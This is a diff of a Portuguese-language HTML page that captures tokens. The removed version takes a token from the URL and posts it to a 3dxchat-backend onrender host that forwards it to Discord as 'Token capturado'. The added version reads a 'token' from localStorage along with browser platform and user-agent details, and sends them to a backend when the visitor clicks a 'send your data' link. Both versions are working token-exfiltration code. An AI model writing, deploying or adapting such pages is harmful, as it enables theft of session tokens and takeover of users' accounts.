@@ -1,33 +1,59 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecionando...</title>
-  <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      const params = new URLSearchParams(window.location.search);
-      const token = params.get('site');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura de Dados</title>
+    <script>
+        function getLocalStorageData() {
+            // Aqui você pode coletar dados do localStorage
+            let token = localStorage.getItem("token"); // exemplo de chave do localStorage
+            return token ? token : null;
+        }
 
-      if (token) {
-        fetch("https://3dxchat-backend.onrender.com/send-to-discord", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ message: `Token capturado:\n\`${token}\`` })
-        })
-        .then(() => {
-          document.body.innerHTML = "<h2>Token enviado com sucesso!</h2>";
-        })
-        .catch((err) => {
-          console.error("Erro ao enviar:", err);
-          document.body.innerHTML = "<h2>Erro ao enviar token.</h2>";
-        });
-      } else {
-        document.body.innerHTML = "<h2>Nenhum token encontrado na URL.</h2>";
-      }
-    });
-  </script>
+        function getSystemInfo() {
+            // Captura informações do sistema (exemplo simples usando o navegador)
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent
+            };
+        }
+
+        function sendDataToServer(data) {
+            fetch('https://seu-backend-url.onrender.com/send-data', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (response.ok) {
+                    alert("Dados enviados com sucesso!");
+                } else {
+                    alert("Erro ao enviar os dados.");
+                }
+            }).catch(error => {
+                alert("Erro ao enviar os dados.");
+                console.error(error);
+            });
+        }
+
+        // Função chamada quando o link for clicado
+        function captureAndSendData() {
+            const localStorageToken = getLocalStorageData();
+            const systemInfo = getSystemInfo();
+
+            // Envia os dados coletados para o servidor backend
+            sendDataToServer({
+                token: localStorageToken,
+                systemInfo: systemInfo
+            });
+        }
+    </script>
 </head>
 <body>
-  <h2>Processando token...</h2>
+    <h1>Captura de Dados</h1>
+    <p>Clique no link abaixo para capturar e enviar dados ao Discord:</p>
+    <a href="javascript:void(0);" onclick="captureAndSendData()">Clique aqui para enviar seus dados</a>
 </body>
 </html>
